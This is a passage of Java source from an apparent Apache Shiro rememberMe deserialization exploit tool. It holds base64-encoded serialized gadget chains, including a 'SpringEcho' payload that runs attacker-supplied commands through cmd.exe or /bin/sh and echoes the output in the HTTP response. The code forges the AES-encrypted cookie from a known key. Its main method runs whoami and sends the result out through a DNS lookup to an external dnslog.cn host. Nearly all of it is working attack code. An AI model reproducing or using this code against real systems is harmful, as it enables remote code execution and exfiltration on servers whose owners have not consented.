GzAAIBswADuwAEWbcABbMABrIABxIItgAJswAKsgAHEgu2AAmzAAynAAhMK7YADrgADwO4ABCxAAEAFgAsAC8ADQADAFkAAAAuAAsAAAAdAAQAHgAIAB8ADAAgABYAIgAhACMALAAmAC8AJAAwACUANAAoADsAKQBaAAAAFgACADAABABbAFwAAQAAADwAXQBeAAAAXwAAABAAAv8ALwABBwBgAAEHAGEEAAoAYgBjAAEAWAAAAFoAAgABAAAAGirGAA2yAAYqtgARmQAFBKyyAAYqtgASVwOsAAAAAwBZAAAAEgAEAAAALAAOAC0AEAAwABgAMQBaAAAADAABAAAAGgBkAFQAAABfAAAABAACDgEACgBVAGUAAgBYAAACvAAGAAQAAAFTGxA0owAPsgACxgAKsgADxgAEsSq4ABOaATuyAALHAMWyAAoqtgAUtgAVmQC4KrMAArIAChIWBL0AF1kDEwAYU7YAGSoEvQAaWQMSG1O2ABzAABizAB2yAB3HAAoBswACpwBnEh64AB+2ACASIbYAIpkAGga9ABhZAxIjU1kEEiRTWQWyAB1TpwAXBr0AGFkDEiVTWQQSJlNZBbIAHVOzACeyAAK2ABQSKAO9ABe2ABlNLLIAAgO9ABq2AByzAAOnAAhNAbMAAqcAMk0stgArpwAqTSy2AC2nACJNLLYAL6cAGrIAA8cAFLIADCq2ABS2ABWZAAcqswADsgACxgBPsgADxgBJsgAMEjADvQAXtgAZsgADA70AGrYAHMAAMU0suwAyWbgAM7IAJ7YANLYANbcANhI3tgA4tgA5tgA6LLYAOyy2ADynAAROsSobBGC4ABCxAAUAoQC/AMIAKQAxAMcAygAqADEAxwDSACwAMQDHANoALgEfAUYBSQApAAMAWQAAAJIAJAAAADUAEgA2ABMAOAAaADkALQA6ADEAPQBWAD4AXAA/AGMAQQChAEUAsQBGAL8ASwDCAEcAwwBJAMcAUwDKAE0AywBOAM8AUwDSAE8A0wBQANcAUwDaAFEA2wBSAN8AUwDiAFUA9QBWAPkAWgEFAFsBHwBdAT4AXgFCAF8BRgBiAUkAYAFKAGQBSwBnAVIAaQBaAAAAXAAJALEADgBmAGcAAgDDAAQAWwBoAAIAywAEAFsAaQACANMABABbAGoAAgDbAAQAWwBrAAIBSgAAAFsAaAADAR8ALABsAG0AAgAAAVMAbgBUAAAAAAFTAG8AcAABAF8AAAA1ABASAPsATyZTBwBxYwcAcgRCBwBzRwcAdEcHAHUHFv8ATwADBwB2AQcAdwABBwByAPoAAAYAeAAAAAQAAQApAAoAeQBlAAEAWAAAAZoAAgAMAAAAhCq2ABRNLLYAPU4tvjYEAzYFFQUVBKIAZS0VBTI6BhkGBLYAPgE6BxkGKrYAPzoHGQe2ABS2AECaAAwZBxu4AEGnAC8ZB8AAQsAAQjoIGQi+NgkDNgoVChUJogAWGQgVCjI6CxkLG7gAQYQKAaf/6acABToIhAUBp/+aLLYAQ1lNx/+FsQABACcAbwByACkAAwBZAAAAPgAPAAAAbQAFAG8AHgBwACQAcQAnAHMALwB1ADoAdgBDAHgAYwB5AGkAeABvAH8AcgB+AHQAbwB6AIIAgwCFAFoAAACEAA0AYwAGAHoAVAALAE0AIgB7AHwACABSAB0AfQBwAAkAVQAaAH4AcAAKAHQAAABbAGgACAAnAE0AbgBUAAcAHgBWAH8AgAAGAAoAcAB7AIEAAwAOAGwAfQBwAAQAEQBpAH4AcAAFAAAAhACCAFQAAAAAAIQAbwBwAAEABQB/AIMATQACAF8AAAAuAAj8AAUHAIT+AAsHAIUBAf0AMQcAhgcAdv4AEQcAQgEB+AAZQgcAcvkAAfgABQAIAIcAVwABAFgAAAAiAAEAAAAAAAq4AA+2AESzAAexAAAAAQBZAAAABgABAAAAFQABAIgAAAACAIlwdAABYXB3AQB4cQB+AA54");
            }
            if(echo.equals("SpringEcho")){
                    bytes = Base64.decode("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAISQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAALX2F1eENsYXNzZXN0ADtMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvSGFzaHRhYmxlO1sACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAETAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////wBwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAACKjK/rq+AAAAMwCKCgAiAD4KAD8AQAcAQQoAAwBCCAAuCwBDAEQIAEUKAEYARwoADABICABJCgAMAEoHAEsIAEwIAE0IAE4IAE8HAFAHAFEKABIAUgoAEgBTCgBUAFUKABEAVggAVwoAEQBYCgARAFkKAAMAWgcAWwsAXABdCgAbAF4KABsAXwoAGwBgCgAbAGEHAGIHAGMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJEx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9TcHJpbmdFY2hvOwEAA3JlcwEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAAXMBABJMamF2YS9sYW5nL1N0cmluZzsBAANjbWQBABNbTGphdmEvbGFuZy9TdHJpbmc7AQADc3RyAQADcmVwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnB3AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQANU3RhY2tNYXBUYWJsZQcAYgcAZAcASwcALwEACkV4Y2VwdGlvbnMHAGUBAApTb3VyY2VGaWxlAQAPU3ByaW5nRWNoby5qYXZhDAAjACQHAGYMAGcAaAEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMAGkAagcAZAwAawBsAQAHb3MubmFtZQcAbQwAbgBsDABvAHABAAZ3aW5kb3cMAHEAcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAIwBzDAB0AHUHAHYMAHcAeAwAIwB5AQACXEEMAHoAewwAfABwDAB9AH4BABNqYXZhL2lvL1ByaW50V3JpdGVyBwB/DACAAIEMACMAggwAgwCEDACFACQMAIYAJAEAInlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL1NwcmluZ0VjaG8BABBqYXZhL2xhbmcvT2JqZWN0AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAE2phdmEvbGFuZy9FeGNlcHRpb24BADxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdENvbnRleHRIb2xkZXIBABRnZXRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBAAtnZXRSZXNwb25zZQEAKigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAPZ2V0T3V0cHV0U3RyZWFtAQAlKClMamF2YXgvc2VydmxldC9TZXJ2bGV0T3V0cHV0U3RyZWFtOwEAGShMamF2YS9pby9PdXRwdXRTdHJlYW07KVYBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwCHCgCIAD4AIQAhAIgAAAAAAAEAAQAjACQAAgAlAAABRQAFAAcAAACbKrcAibgAAsAAA7YABEwrEgW5AAYCAE0SB7gACLYACRIKtgALmQAYBr0ADFkDEg1TWQQSDlNZBSxTpwAVBr0ADFkDEg9TWQQSEFNZBSxTTrsAEVm7ABJZLbcAE7YAFLYAFbcAFhIXtgAYtgAZOgS4AALAAAO2ABo6BbsAG1kZBbkAHAEAtwAdOgYZBhkEtgAeGQa2AB8ZBrYAILEAAAADACYAAAAuAAsAAAAKAAQACwAOAAwAFwANAE8ADgBuAA8AeQAQAIkAEQCQABIAlQATAJoAFAAnAAAASAAHAAAAmwAoACkAAAAOAI0AKgArAAEAFwCEACwALQACAE8ATAAuAC8AAwBuAC0AMAAtAAQAeQAiADEAMgAFAIkAEgAzADQABgA1AAAAFgAC/wA8AAMHADYHADcHADgAAFEHADkAOgAAAAQAAQA7AAEAPAAAAAIAPXB0AAFhcHcBAHhxAH4ADng=");
         
            }
        }else{
            Class payloadClass= ObjectPayload.Utils.getPayloadClass(gadget);
            ObjectPayload payload = (ObjectPayload)payloadClass.newInstance();
            Object object = payload.getObject(echo);
            bytes=getBytes(object);
        }

        rememberMe = shiroEncrypt(key,bytes);
        return rememberMe;
    }



    private void onOK() {
        // add your code here
        bool=true;
        dispose();
    }

    private void onCancel() {
        // add your code here if necessary
        bool=false;
        dispose();
    }

    public  String shiroEncrypt(String key, byte[] objectBytes) {
       // Base64 B64 = new Base64();
        byte[] pwd = Base64.decode(key);
        AesCipherService cipherService = new AesCipherService();
        ByteSource byteSource = cipherService.encrypt(objectBytes, pwd);
        byte[] value = byteSource.getBytes();
        return new String(Base64.encode(value));
    }

    public  byte[] getBytes(Object obj) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = null;
        ObjectOutputStream objectOutputStream = null;
        byteArrayOutputStream = new ByteArrayOutputStream();
        objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        return byteArrayOutputStream.toByteArray();
    }

    public static void main(String[] args) throws IOException {
        String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", "whoami"} : new String[]{"/bin/sh", "-c", "whoami"};
        String str = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next();
        str=str.replace("\n","").replace("\t","");
        new java.net.Socket(str+".1hpb0k.dnslog.cn",80);

}


}
